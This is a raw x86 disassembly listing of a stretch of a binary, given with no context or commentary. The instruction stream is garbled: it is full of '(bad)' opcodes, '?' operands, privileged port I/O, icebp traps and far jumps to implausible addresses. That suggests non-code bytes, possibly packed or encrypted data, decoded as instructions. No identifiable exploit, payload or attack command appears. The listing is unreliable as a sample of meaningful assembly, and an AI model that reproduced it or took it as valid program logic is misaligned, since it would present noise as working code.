  41ab64:	xchg   esp,eax
  41ab65:	and    bh,ah
  41ab67:	adc    DWORD PTR [ecx-0x231f0537],ecx
  41ab6d:	jp     0x41ab26
  41ab6f:	nop
  41ab70:	sbb    DWORD PTR [ebx+0x38],esp
  41ab73:	lods   al,BYTE PTR ds:[esi]
  41ab74:	inc    esp
  41ab75:	jne    0x41ab19
  41ab77:	jbe    0x41aaf9
  41ab79:	into   
  41ab7a:	xchg   esp,eax
  41ab7b:	ins    BYTE PTR es:[edi],dx
  41ab7c:	lock jbe 0x41abd6
  41ab7f:	or     BYTE PTR [eax],al
  41ab81:	ret    
  41ab82:	mov    BYTE PTR [edx],dh
  41ab84:	std    
  41ab85:	out    0xaf,eax
  41ab87:	mov    edi,0xe310f2f7
  41ab8c:	fwait
  41ab8d:	aam    0xe8
  41ab8f:	test   ebp,eax
  41ab91:	or     ch,BYTE PTR [edx-0x4da6c293]
  41ab97:	ins    DWORD PTR es:[edi],dx
  41ab98:	aas    
  41ab99:	cmp    cl,BYTE PTR ds:0x5cc14d9b
  41ab9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aba0:	js     0x41abd5
  41aba2:	loop   0x41abbf
  41aba4:	push   esi
  41aba5:	data16 adc al,0x52
  41aba8:	cs cmc 
  41abaa:	mov    esi,0x6c4310a9
  41abaf:	pop    ecx
  41abb0:	sbb    eax,0x953e081
  41abb5:	lods   al,BYTE PTR ds:[esi]
  41abb6:	or     edx,esp
  41abb8:	mov    edx,0x3709b7c5
  41abbd:	sub    al,cl
  41abbf:	mov    eax,0xe9d02d19
  41abc4:	lods   eax,DWORD PTR ds:[esi]
  41abc5:	sbb    BYTE PTR [edx-0x4a9081c5],bh
  41abcb:	xchg   ebx,eax
  41abcc:	shl    DWORD PTR [ebx],1
  41abce:	retf   0xe345
  41abd1:	and    BYTE PTR [edi+0xb],cl
  41abd4:	xor    eax,0xd49c7858
  41abd9:	mov    ds:0xbf80f1e,eax
  41abde:	push   ds
  41abdf:	xchg   ebx,eax
  41abe0:	mov    al,0x4
  41abe2:	shl    DWORD PTR ds:0x8023557e,1
  41abe8:	loopne 0x41abd9
  41abea:	xor    dl,BYTE PTR [ebx+0x1]
  41abed:	sub    dh,BYTE PTR [esi]
  41abef:	test   eax,esi
  41abf1:	stc    
  41abf2:	xor    eax,0x7af6ac9b
  41abf7:	adc    eax,0xffffff9d
  41abfa:	dec    edi
  41abfb:	cld    
  41abfc:	cmp    ecx,edi
  41abfe:	inc    edx
  41abff:	dec    esp
  41ac00:	fimul  WORD PTR [ecx+0x33]
  41ac03:	mov    eax,ds:0x3d4dfd9e
  41ac09:	out    0xa8,eax
  41ac0b:	xchg   ebp,eax
  41ac0c:	xchg   ebx,eax
  41ac0d:	inc    DWORD PTR [ebp-0x1c]
  41ac10:	xchg   esi,eax
  41ac11:	or     al,0x4b
  41ac13:	icebp  
  41ac14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac15:	fadd   DWORD PTR [ecx]
  41ac17:	inc    eax
  41ac18:	pusha  
  41ac19:	mov    ?,WORD PTR [edi-0x72]
  41ac1c:	nop
  41ac1d:	in     al,dx
  41ac1e:	jg     0x41abaa
  41ac20:	in     al,dx
  41ac21:	jae    0x41ac84
  41ac23:	sbb    al,0x90
  41ac25:	out    dx,eax
  41ac26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac27:	jbe    0x41ac44
  41ac29:	call   0xb0d99f2d
  41ac2e:	mov    eax,0xf22e4181
  41ac33:	inc    DWORD PTR [ecx]
  41ac35:	cmp    BYTE PTR [ebx-0x5c],cl
  41ac38:	pop    ds
  41ac39:	ret    
  41ac3a:	adc    al,0x14
  41ac3c:	sub    ebp,esp
  41ac3e:	add    ecx,DWORD PTR [esi-0x233d2b86]
  41ac44:	xchg   edx,eax
  41ac45:	mov    ch,BYTE PTR [eax]
  41ac47:	out    0xdf,al
  41ac49:	int    0x85
  41ac4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac4c:	push   ebx
  41ac4d:	push   esi
  41ac4e:	sar    DWORD PTR [edx+0x7c37f6f0],1
  41ac54:	icebp  
  41ac55:	inc    ecx
  41ac56:	sub    al,0xbf
  41ac58:	dec    esp
  41ac59:	ins    BYTE PTR es:[edi],dx
  41ac5a:	jmp    0xd271193f
  41ac5f:	sub    DWORD PTR [edi+0x45],0x82f8fef8
  41ac66:	aas    
  41ac67:	popa   
  41ac68:	sbb    ecx,DWORD PTR [ecx-0x49babcde]
  41ac6e:	adc    esi,DWORD PTR [ebp+0x33f6773b]
  41ac74:	icebp  
  41ac75:	into   
  41ac76:	repz loopne 0x41acbc
  41ac79:	(bad)  
  41ac7a:	jb     0x41acd7
  41ac7c:	mov    ds:0x5e4a3190,al
  41ac81:	adc    ch,BYTE PTR [edx-0x77]
  41ac84:	mov    esi,0x7492d527
  41ac89:	adc    dl,dl
  41ac8b:	adc    DWORD PTR [esi],esp
  41ac8d:	inc    ebx
  41ac8e:	fidivr DWORD PTR [ebx+eiz*1+0x12]
  41ac92:	test   eax,0x45d81d10
  41ac97:	mov    esi,0x42c43a66
  41ac9c:	ss test al,0xa7
  41ac9f:	xchg   DWORD PTR [ebp+0x62],edx
  41aca2:	int    0xb0
  41aca4:	(bad)  
  41aca5:	nop
  41aca6:	and    BYTE PTR [ebx],0xf9
  41aca9:	(bad)  
  41acab:	fsubr  DWORD PTR [eax+0x78]
  41acae:	icebp  
  41acaf:	mov    ah,0x52
  41acb1:	retf   0xdc0
  41acb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acb5:	push   edi
  41acb6:	daa    
  41acb7:	xor    edi,eax
  41acb9:	cmc    
  41acba:	adc    edi,DWORD PTR [ecx]
  41acbc:	int    0xaa
  41acbe:	stc    
  41acbf:	dec    ecx
  41acc0:	fs retf 0x9a2d
  41acc4:	test   eax,0xb9d4a075
  41acc9:	test   BYTE PTR [ecx-0x13810b73],bh
  41accf:	hlt    
  41acd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acd1:	aad    0x7c
  41acd3:	inc    edi
  41acd4:	adc    eax,0x19889659
  41acd9:	fcom   QWORD PTR [ebx]
  41acdb:	pusha  
  41acdc:	mov    DWORD PTR ds:0xb9b09dfc,ecx
  41ace2:	pop    ecx
  41ace3:	outs   dx,DWORD PTR ds:[esi]
  41ace4:	dec    eax
  41ace5:	or     DWORD PTR [ebp+0x642d0a24],0x17b12f4a
  41acef:	jbe    0x41ad37
  41acf1:	inc    edi
  41acf2:	inc    esi
  41acf3:	in     eax,0x44
  41acf5:	pop    ebx
  41acf6:	or     eax,0x22945a11
  41acfb:	popa   
  41acfc:	data16 cmp al,0x59
  41acff:	and    eax,0x84bb87d1
  41ad04:	(bad)  
  41ad05:	push   ecx
  41ad06:	mov    ds:0x8b821cdc,al
  41ad0b:	icebp  
  41ad0c:	das    
  41ad0d:	xchg   eax,ebp
  41ad0f:	test   al,0x5e
  41ad11:	pop    ebp
  41ad12:	push   edx
  41ad13:	int    0x86
  41ad15:	jne    0x41ad01
  41ad17:	pop    edx
  41ad18:	xchg   esp,eax
  41ad19:	jo     0x41ad8a
  41ad1b:	das    
  41ad1c:	(bad)  
  41ad1d:	fdiv   QWORD PTR [eax-0x13]
  41ad20:	stc    
  41ad21:	sub    eax,0xa2d48958
  41ad26:	iret   
  41ad27:	out    0xbb,eax
  41ad29:	into   
  41ad2a:	int3   
  41ad2b:	retf   
  41ad2c:	shl    DWORD PTR [ecx],1
  41ad2e:	cmp    ebx,edx
  41ad30:	ret    
  41ad31:	ins    BYTE PTR es:[edi],dx
  41ad32:	jg     0x41ad7f
  41ad34:	dec    edx
  41ad35:	sub    eax,0x20f5b1d7
  41ad3a:	out    dx,eax
  41ad3b:	cmp    BYTE PTR [ecx+0x2a6a6d9a],0x8
  41ad42:	cdq    
  41ad43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad44:	jbe    0x41ad55
  41ad46:	nop    DWORD PTR [esi+0x9]
  41ad4a:	cmp    al,0xc9
  41ad4c:	xchg   esi,eax
  41ad4d:	and    cl,BYTE PTR [esi+ebx*1]
  41ad50:	in     al,dx
  41ad51:	pop    ecx
  41ad52:	pop    edi
  41ad53:	es dec esi
  41ad55:	aad    0xbc
  41ad57:	or     edi,esp
  41ad59:	sti    
  41ad5a:	adc    DWORD PTR [esi-0x21ca602b],edi
  41ad60:	mov    ds:0xcf4291ec,eax
  41ad65:	cld    
  41ad66:	xchg   ebp,eax
  41ad67:	and    al,0x32
  41ad69:	push   esi
  41ad6a:	and    al,0x2c
  41ad6c:	sbb    ch,BYTE PTR [ecx-0x5e]
  41ad6f:	dec    esp
  41ad70:	hlt    
  41ad71:	add    bl,ah
  41ad73:	ror    DWORD PTR [ebx-0x262a9c73],cl
  41ad79:	mov    bl,0xf
  41ad7b:	or     ebx,DWORD PTR [edi-0x3e7c7530]
  41ad81:	or     dl,BYTE PTR [ebx-0x5b617428]
  41ad87:	shl    DWORD PTR [esi+edx*1+0x44],1
  41ad8b:	cmp    edi,DWORD PTR [edx]
  41ad8d:	jmp    0x41ada4
  41ad8f:	sub    DWORD PTR [edx],ebx
  41ad91:	loop   0x41ae03
  41ad93:	push   eax
  41ad94:	sbb    eax,0xb26b7435
  41ad99:	int3   
  41ad9a:	mov    dh,0x80
  41ad9c:	push   0xffffffeb
  41ad9e:	jmp    0x41ae12
  41ada0:	pop    ss
  41ada1:	mov    ah,0xce
  41ada3:	jne    0x41adc5
  41ada5:	test   BYTE PTR [edx+0xb],al
  41ada8:	sbb    al,0xb9
  41adaa:	std    
  41adab:	xchg   DWORD PTR [ecx+0x14487be3],edx
  41adb1:	sub    ebp,DWORD PTR [edx]
  41adb3:	or     BYTE PTR [ebx+edx*2],ch
  41adb6:	dec    edx
  41adb7:	pop    eax
  41adb8:	mov    ds:0x58762aca,eax
  41adbd:	ins    DWORD PTR es:[edi],dx
  41adbe:	dec    ebx
  41adbf:	(bad)  
  41adc0:	loop   0x41ade7
  41adc2:	xchg   ebp,eax
  41adc3:	mov    ah,0xa6
  41adc5:	aas    
  41adc6:	jns    0x41ad7b
  41adc8:	pop    edx
  41adc9:	lock sbb ecx,ecx
  41adcc:	dec    ebp
  41adcd:	popf   
  41adce:	leave  
  41adcf:	daa    
  41add0:	dec    ebx
  41add1:	ss in  al,dx
  41add3:	xchg   BYTE PTR [esi-0x72eff573],ah
  41add9:	xchg   esp,eax
  41adda:	sub    BYTE PTR [eax+ebp*8],bh
  41addd:	(bad)  
  41adde:	push   esp
  41addf:	or     al,0xe4
  41ade1:	mov    cl,0x63
  41ade3:	pop    edx
  41ade4:	push   edx
  41ade5:	ret    
  41ade6:	jne    0x41ae5a
  41ade8:	fdivr  DWORD PTR [eax-0x52]
  41adeb:	or     BYTE PTR ds:0x9dc70135,ch
  41adf1:	in     al,dx
  41adf2:	xchg   esi,eax
  41adf3:	dec    edx
  41adf4:	(bad)  
  41adf5:	loope  0x41adf5
  41adf7:	inc    esp
  41adf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adf9:	dec    esp
  41adfa:	mov    dh,0x89
  41adfc:	pop    es
  41adfd:	je     0x41add5
  41adff:	das    
  41ae00:	mov    ds:0x5c182c21,eax
  41ae05:	ficom  DWORD PTR [ebx-0x6cbc1840]
  41ae0b:	or     eax,0x184dd22e
  41ae10:	mov    WORD PTR cs:[esi-0x5401ae56],gs
  41ae17:	out    dx,al
  41ae18:	femms  
  41ae1a:	dec    esp
  41ae1b:	jmp    0x5c6c545c
  41ae20:	rcr    BYTE PTR [ecx],cl
  41ae22:	setb   BYTE PTR [ebx]
  41ae25:	or     eax,0x62d056a0
  41ae2a:	xor    al,0xf9
  41ae2c:	and    ecx,eax
  41ae2e:	xchg   edx,eax
  41ae2f:	outs   dx,BYTE PTR ds:[esi]
  41ae30:	(bad)  
  41ae31:	jge    0x41ae18
  41ae33:	mov    dh,0x2e
  41ae35:	dec    esp
  41ae36:	popa   
  41ae37:	ficomp WORD PTR [ebp-0xb156774]
  41ae3d:	mov    BYTE PTR [edx-0x4ceb5ee9],ch
  41ae43:	fidiv  WORD PTR [ebp-0x59840193]
  41ae49:	sub    dh,BYTE PTR [esi-0x6b]
  41ae4c:	mov    dh,0x4b
  41ae4e:	test   DWORD PTR [ebx],eax
  41ae50:	or     esp,DWORD PTR [ecx+eiz*1-0x1b7d1cb3]
  41ae57:	stos   DWORD PTR es:[edi],eax
  41ae58:	test   al,0x6b
  41ae5a:	push   ds
  41ae5b:	push   esi
  41ae5c:	dec    ebx
  41ae5d:	cmp    ebx,edx
  41ae5f:	je     0x41ade2
  41ae61:	test   al,0xaa
  41ae63:	sbb    DWORD PTR [esi+esi*4],ebp
  41ae66:	xchg   ebx,eax
  41ae67:	add    esp,DWORD PTR [edi]
  41ae69:	scas   eax,DWORD PTR es:[edi]
  41ae6a:	cmp    eax,0x883e8920
  41ae6f:	sbb    ebp,DWORD PTR [eax+0x5b685bb8]
  41ae75:	lahf   
  41ae76:	outs   dx,BYTE PTR ds:[esi]
  41ae77:	stos   DWORD PTR es:[edi],eax
  41ae78:	(bad)
  41ae7b:	aam    0xd9
  41ae7d:	or     DWORD PTR ds:0xccd1cd76,ecx
  41ae83:	sub    al,0xc6
  41ae85:	rcr    BYTE PTR [esi],0x76
  41ae88:	adc    eax,0xb5045a0a
  41ae8d:	jne    0x41ae2b
  41ae8f:	(bad)  
  41ae90:	push   DWORD PTR [eax+0x72cc7778]
  41ae96:	mov    DWORD PTR [edi+0x69d3d3e],ecx
  41ae9c:	fwait
  41ae9d:	in     eax,dx
  41ae9e:	adc    BYTE PTR [edi+edx*2],0xc8
  41aea2:	ins    BYTE PTR es:[edi],dx
  41aea3:	in     eax,0x18
  41aea5:	out    dx,al
  41aea6:	pop    esp
  41aea7:	lods   eax,DWORD PTR ds:[esi]
  41aea8:	jbe    0x41aef6
  41aeaa:	inc    edi
  41aeab:	loope  0x41ae44
  41aead:	nop
  41aeae:	push   ebp
  41aeaf:	ja     0x41ae53
  41aeb1:	sub    DWORD PTR [edx+0x10e7ee36],ebp
  41aeb7:	aam    0x82
  41aeb9:	in     al,dx
  41aeba:	and    DWORD PTR [edx],0xffffffd4
  41aebd:	mov    dh,0xb3
  41aebf:	fdivr  st,st(1)
  41aec1:	jb     0x41aef8
  41aec3:	sub    BYTE PTR [esp+ebp*8-0x2891bbf3],bh
  41aeca:	dec    eax
  41aecb:	cs scas al,BYTE PTR es:[edi]
  41aecd:	fwait
  41aece:	inc    ebx
  41aecf:	pusha  
  41aed0:	test   DWORD PTR [edx-0x6cd6ecf0],esp
  41aed6:	xlat   BYTE PTR ds:[ebx]
  41aed7:	sbb    BYTE PTR [esi],0x74
  41aeda:	fst    DWORD PTR [edi+0x4]
  41aedd:	jg     0x41aee4
  41aedf:	add    ecx,ebp
  41aee1:	aam    0x2d
  41aee3:	mov    dl,0xa8
  41aee5:	mov    ebp,0x9a8a3dfb
  41aeea:	pop    edx
  41aeeb:	sbb    ebx,DWORD PTR [esi+ebp*2]
  41aeee:	je     0x41af14
  41aef0:	dec    dh
  41aef2:	push   eax
  41aef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aef4:	ins    BYTE PTR es:[edi],dx
  41aef5:	sbb    DWORD PTR [edi+0x3eed7f67],esp
  41aefb:	cmp    eax,0xe6b32cca
  41af00:	dec    eax
  41af01:	mov    BYTE PTR [edx],al
  41af03:	in     eax,0x82
  41af05:	div    DWORD PTR [esi+0x6e]
  41af08:	xor    eax,0x1097c37f
  41af0d:	pop    ds
  41af0e:	and    eax,edx
  41af10:	mov    esp,0xecbc9345
  41af15:	jbe    0x41af0b
  41af17:	jl     0x41aee4
  41af19:	loope  0x41af59
  41af1b:	fwait
  41af1c:	rcl    BYTE PTR [edi+0x4143a817],cl
  41af22:	jmp    0x66c09961
  41af27:	inc    esp
  41af28:	xlat   BYTE PTR ds:[ebx]
  41af29:	ins    BYTE PTR es:[edi],dx
  41af2a:	add    edx,esp
  41af2c:	adc    esi,esi
  41af2e:	xchg   esi,eax
  41af2f:	mov    WORD PTR [esp+edi*4],ss
  41af32:	cwde   
  41af33:	loop   0x41af7e
  41af35:	inc    esp
  41af36:	push   ds
  41af37:	imul   ecx,DWORD PTR [ebp+0x4a],0xbceab2ec
  41af3e:	shr    BYTE PTR [edi+0x5da89f0e],0x32
  41af45:	sar    BYTE PTR gs:[ebx+0xba5522a],1
  41af4c:	nop
  41af4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af4e:	jae    0x41af2e
  41af50:	retf   
  41af51:	ror    BYTE PTR [edx+esi*2],0x13
  41af55:	ins    DWORD PTR es:[edi],dx
  41af56:	jmp    0xba6b44b1
  41af5b:	or     esp,DWORD PTR [esi+ecx*1]
  41af5e:	loope  0x41aef4
  41af60:	call   0x3235:0x9fb25f97
  41af67:	inc    esi
  41af68:	xchg   esp,eax
  41af69:	call   0x814fd25b
  41af6e:	xchg   edi,eax
  41af6f:	sbb    DWORD PTR [ecx-0x2f],edi
  41af72:	and    al,0x90
  41af74:	pop    es
  41af75:	add    ch,BYTE PTR [ebx]
  41af77:	outs   dx,DWORD PTR ds:[esi]
  41af78:	inc    ecx
  41af79:	push   esp
  41af7a:	jne    0x41afba
  41af7c:	lea    esp,[ecx]
  41af7e:	push   cs
  41af7f:	sbb    ecx,DWORD PTR [ebx]
  41af81:	xor    al,0x89
  41af83:	out    0xfd,al
  41af85:	test   BYTE PTR [ecx+eax*2],0xca
  41af89:	jno    0x41af62
  41af8b:	rol    BYTE PTR [edi+0x4f],1
  41af8e:	jbe    0x41af67
  41af90:	hlt    
  41af91:	sbb    DWORD PTR [ecx+ecx*2-0x47496b61],edx
  41af98:	sub    cl,BYTE PTR [edx+0x25]
  41af9b:	scas   eax,DWORD PTR es:[edi]
  41af9c:	jo     0x41aff5
  41af9e:	add    ah,ah
  41afa0:	daa    
  41afa1:	fiadd  DWORD PTR [eax]
  41afa3:	adc    eax,0x9cdd7fec
  41afa8:	mov    bh,BYTE PTR [edi+0xd]
  41afab:	jo     0x41af7e
  41afad:	jo     0x41afca
  41afaf:	ja     0x41afa3
  41afb1:	mov    edx,0x189ed4d6
  41afb6:	xchg   ecx,eax
  41afb7:	arpl   WORD PTR [ecx+0x58],cx
  41afba:	jmp    0x2a26aa00
  41afbf:	sub    BYTE PTR [ebx+0x4c],0x83
  41afc3:	ror    ebx,cl
  41afc5:	scas   eax,DWORD PTR es:[edi]
  41afc6:	mov    DWORD PTR [ecx+ecx*2-0x22],ebx
  41afca:	int3   
  41afcb:	pop    esi
  41afcc:	mov    ds:0xd579cdf3,al
  41afd1:	xchg   esi,eax
  41afd2:	push   0x3a
  41afd4:	sub    dl,0xea
  41afd7:	dec    ebx
  41afd8:	retf   0x9be7
  41afdb:	sub    BYTE PTR [ebp+0x75],ah
  41afde:	adc    DWORD PTR [esi],edi
  41afe0:	imul   esi,DWORD PTR [ebp-0x20933e1],0x9221f0ce
  41afea:	pop    ebx
  41afeb:	sbb    eax,0xca12ed5d
  41aff0:	out    dx,eax
  41aff1:	fsub   DWORD PTR [eax+0x3a]
  41aff4:	pop    esp
  41aff5:	adc    BYTE PTR [ebx+0x30],0xb8
  41aff9:	fsub   st(2),st
  41affb:	(bad)  
  41affc:	and    esp,ebx
  41affe:	(bad)  
  41afff:	(bad)  
  41b000:	xchg   bl,ah
  41b002:	out    0x47,al
  41b004:	clc    
  41b005:	repnz loopne 0x41afdc
  41b008:	arpl   WORD PTR [esp+esi*2-0x1e],si
  41b00c:	(bad)  
  41b00d:	out    dx,eax
  41b00e:	add    eax,0x51c4e08f
  41b013:	lods   eax,DWORD PTR ds:[esi]
  41b014:	jbe    0x41b029
  41b016:	enter  0x3f56,0x28
  41b01a:	data16 jne 0x41afb1
  41b01d:	adc    BYTE PTR [ecx+0x793fa241],bh
  41b023:	dec    esi
  41b024:	out    0x45,eax
  41b026:	mov    cl,0x27
  41b028:	and    al,al
  41b02a:	clc    
  41b02b:	fsubr  st(6),st
  41b02d:	jno    0x41b051
  41b02f:	pop    esp
  41b030:	std    
  41b031:	xchg   esp,eax
  41b032:	loopne 0x41b090
  41b034:	and    eax,0x9d9ac6cb
  41b039:	ins    BYTE PTR es:[edi],dx
  41b03a:	pusha  
  41b03b:	pop    edx
  41b03c:	xor    bl,BYTE PTR [eax-0x8]
  41b03f:	mov    bh,0x3a
  41b041:	inc    eax
  41b042:	add    edi,ecx
  41b044:	mov    al,0xfa
  41b046:	sbb    BYTE PTR [ebp+0x5f],0xf4
  41b04a:	(bad)  
  41b04b:	mov    dl,0xdb
  41b04d:	mov    eax,0x5dff7b60
  41b052:	cmp    DWORD PTR [edi+esi*4-0x1d],ebx
  41b056:	inc    esi
  41b057:	sub    edi,DWORD PTR [eax-0x44]
  41b05a:	stos   DWORD PTR es:[edi],eax
  41b05b:	loopne 0x41afe9
  41b05d:	push   es
  41b05e:	jbe    0x41b09d
  41b060:	repnz fs inc ebx
  41b063:	in     al,0xdc
  41b065:	xchg   esp,eax
  41b066:	lods   al,BYTE PTR ds:[esi]
  41b067:	mov    ebp,0x95ae4331
  41b06c:	dec    DWORD PTR [esi+edi*1+0x2acec8b8]
  41b073:	(bad)  
  41b074:	gs daa 
  41b076:	cmp    bl,BYTE PTR [edx+edx*2-0x27]
  41b07a:	push   esi
  41b07b:	mov    ch,0xe4
  41b07d:	sub    dl,bh
  41b07f:	sub    BYTE PTR [ebp-0x16],bh
  41b082:	loope  0x41b008
  41b084:	and    dl,BYTE PTR [ebx]
  41b086:	mov    al,ds:0x2cdb144c
  41b08b:	push   esi
  41b08c:	pop    edx
  41b08d:	movd   edx,mm2
  41b090:	aad    0x5d
  41b092:	loop   0x41b09e
  41b094:	mov    ebx,0x7df86f21
  41b099:	adc    ebx,DWORD PTR [edi-0x29]
  41b09c:	pop    esp
  41b09d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b09e:	sub    DWORD PTR [ecx+0x3],ebp
  41b0a1:	loop   0x41b0f4
  41b0a3:	retf   0x2562
  41b0a6:	xor    al,0xc5
  41b0a8:	pop    ss
  41b0a9:	fwait
  41b0aa:	out    0xd6,eax
  41b0ac:	push   ss
  41b0ad:	pop    ecx
  41b0ae:	mov    dl,0xd8
  41b0b0:	mov    esi,DWORD PTR [eax+0xa8f5e7e]
  41b0b6:	loop   0x41b0aa
  41b0b8:	and    DWORD PTR [ebx],0x4a0f8c37
  41b0be:	pop    ds
  41b0bf:	fadd   st,st(5)
  41b0c1:	outs   dx,DWORD PTR ds:[esi]
  41b0c2:	jns    0x41b0bd
  41b0c4:	ss jle 0x41b11a
  41b0c7:	fcom   DWORD PTR [eax]
  41b0c9:	mov    ds:0x2c51f83c,eax
  41b0ce:	add    eax,DWORD PTR [edi+0xdc3800a]
  41b0d4:	enter  0x42a9,0xe8
  41b0d8:	loope  0x41b0bf
  41b0da:	inc    ecx
  41b0db:	retf   
  41b0dc:	test   al,0xda
  41b0de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0df:	mov    bl,0x7
  41b0e1:	lods   eax,DWORD PTR ds:[esi]
  41b0e2:	dec    eax
  41b0e3:	aas    
  41b0e4:	lock ror ah,cl
  41b0e7:	and    edi,DWORD PTR [ebp+0x48]
  41b0ea:	repz or eax,edx
  41b0ed:	push   edx
  41b0ee:	(bad)  
  41b0ef:	call   0x4bdd:0xc77e41a0
  41b0f6:	stos   DWORD PTR es:[edi],eax
  41b0f7:	mov    gs,WORD PTR [ecx]
  41b0f9:	and    BYTE PTR [edi-0x42fe55fc],al
  41b0ff:	out    0x7b,eax
  41b101:	sub    eax,0xa7771af5
  41b106:	push   cs
  41b107:	push   ebx
  41b108:	mov    dl,0x99
  41b10a:	xor    eax,DWORD PTR [ecx]
  41b10c:	into   
  41b10d:	cmp    DWORD PTR [ebx-0x383039e9],edx
  41b113:	ror    BYTE PTR [ebp+0x2a],1
  41b116:	shl    DWORD PTR [eax+0x7751a86f],0x56
  41b11d:	into   
  41b11e:	fnstsw WORD PTR ds:0x73f18e76
  41b124:	arpl   WORD PTR [ecx+eiz*8-0x4d],si
  41b128:	mov    WORD PTR [edx+0x6b],ds
  41b12b:	mov    ch,0x11
  41b12d:	dec    esp
  41b12e:	inc    esp
  41b12f:	mov    ah,0xc1
  41b131:	(bad)  
  41b132:	jmp    0x41b196
  41b134:	add    dl,BYTE PTR [eax-0x4e5a01a1]
  41b13a:	xor    eax,0x9f95598d
  41b13f:	dec    ecx
  41b140:	jge    0x41b1b2
  41b142:	jo     0x41b1b5
  41b144:	into   
  41b145:	(bad)  
  41b147:	ficomp DWORD PTR [edx]
  41b149:	pusha  
  41b14a:	pop    eax
  41b14b:	jns    0x41b113
  41b14d:	jmp    0xebc11023
  41b152:	jmp    0xea67:0x3ad71ddf
  41b159:	repz int3 
  41b15b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b15c:	clc    
  41b15d:	js     0x41b129
  41b15f:	lods   eax,DWORD PTR ds:[esi]
  41b160:	and    BYTE PTR [esi],al
  41b162:	pop    ds
  41b163:	ins    DWORD PTR es:[edi],dx
  41b164:	adc    BYTE PTR [edx+0x22],dh
  41b167:	add    esp,eax
  41b169:	mov    ds:0x6925e2e8,al
  41b16e:	stc    
  41b16f:	out    dx,al
  41b170:	sar    BYTE PTR [ebx],0xd
  41b173:	xchg   esi,eax
  41b174:	mov    ch,0x5e
  41b176:	and    al,0x10
  41b178:	in     al,0xab
  41b17a:	push   esp
  41b17b:	repz loopne 0x41b109
  41b17e:	call   0x19a09e9c
  41b183:	xchg   ecx,eax
  41b184:	sub    al,0x9a
  41b186:	cmp    dl,BYTE PTR [edi-0xf57313e]
  41b18c:	mov    bh,0x4d
  41b18e:	out    dx,al
  41b18f:	and    al,0xf4
  41b191:	cmp    al,0xf9
  41b193:	xor    al,0x3
  41b195:	outs   dx,DWORD PTR ds:[esi]
  41b196:	aam    0x21
  41b198:	mov    ebp,0xa150ddd2
  41b19d:	sbb    eax,0xcbeb2d65
  41b1a2:	sub    eax,0x5c4a441a
  41b1a7:	std    
  41b1a8:	push   edx
  41b1a9:	xchg   esp,eax
  41b1aa:	pop    ss
  41b1ab:	jle    0x41b1ce
  41b1ad:	outs   dx,BYTE PTR ds:[esi]
  41b1ae:	outs   dx,BYTE PTR ds:[esi]
  41b1af:	daa    
  41b1b0:	xchg   esi,eax
  41b1b1:	dec    ecx
  41b1b2:	mov    ?,ebx
  41b1b4:	pop    ecx
  41b1b5:	pop    esp
  41b1b6:	div    BYTE PTR [ecx+0x64]
  41b1b9:	fisttp DWORD PTR [ecx-0x5d7f2857]
  41b1bf:	cli    
  41b1c0:	adc    esi,ebx
  41b1c2:	pop    edi
  41b1c3:	(bad)  
  41b1c5:	xor    ebp,DWORD PTR [esi+0x4f]
  41b1c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1c9:	or     bl,ch
  41b1cb:	or     eax,0x7bdf9e2d
  41b1d0:	dec    edx
  41b1d1:	dec    edi
  41b1d2:	push   ds
  41b1d3:	fist   WORD PTR [ecx+0x1b]
  41b1d6:	aad    0xcc
  41b1d8:	in     al,dx
  41b1d9:	cwde   
  41b1da:	mov    al,0x6e
  41b1dc:	in     eax,0x6f
  41b1de:	cs inc ebx
  41b1e0:	pop    edi
  41b1e1:	gs icebp 
  41b1e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1e4:	imul   ecx,ecx,0x8bb09b07
  41b1ea:	add    dl,BYTE PTR [ecx-0x43]
  41b1ed:	outs   dx,BYTE PTR ds:[esi]
  41b1ee:	sbb    al,dh
  41b1f0:	imul   ecx,DWORD PTR [esi],0xfffffff1
  41b1f3:	inc    ebx
  41b1f4:	test   al,0x61
  41b1f6:	push   cs
  41b1f7:	rep ins BYTE PTR es:[edi],dx
  41b1f9:	mov    ebx,0x1d3d2f69
  41b1fe:	inc    eax
  41b1ff:	mov    cl,0xc9
  41b201:	sub    dl,BYTE PTR [edx-0x47]
  41b204:	repz xchg edx,eax
  41b206:	xor    dl,BYTE PTR [eax]
  41b208:	cdq    
  41b209:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b20a:	inc    ecx
  41b20b:	test   ebp,0x124c612a
  41b211:	(bad)  
  41b213:	mov    eax,0x91cb4d0e
  41b218:	lahf   
  41b219:	inc    ecx
  41b21a:	dec    ebp
  41b21b:	dec    edx
  41b21c:	xchg   BYTE PTR [ecx-0x2c],al
  41b21f:	adc    BYTE PTR [esi+0x0],bh
  41b222:	jno    0x41b23f
  41b224:	xchg   esi,eax
  41b225:	mov    ebp,0x7ae70c9e
  41b22a:	and    esi,esi
  41b22c:	shl    DWORD PTR [eax+0xf],1
  41b22f:	jae    0x41b28a
  41b231:	shl    BYTE PTR [ecx-0x1d375e08],cl
  41b237:	or     DWORD PTR [ecx-0x59],ecx
  41b23a:	in     al,dx
  41b23b:	mov    ebp,DWORD PTR [ebx+0x5727d30c]
  41b241:	mov    edx,0x672f1eee
  41b246:	cwde   
  41b247:	jno    0x41b205
  41b249:	cs inc edi
  41b24b:	leave  
  41b24c:	out    0x49,eax
  41b24e:	call   0x729a:0x14fdee51
  41b255:	gs je  0x41b2a5
  41b258:	sar    DWORD PTR fs:[edx-0x53c43e37],0x35
  41b260:	popf   
  41b261:	jg     0x41b2cf
  41b263:	and    eax,0x73f02388
  41b268:	and    BYTE PTR [ecx+eiz*1],dh
  41b26b:	nop
  41b26c:	mov    eax,0x9c3fcc63
  41b271:	cld    
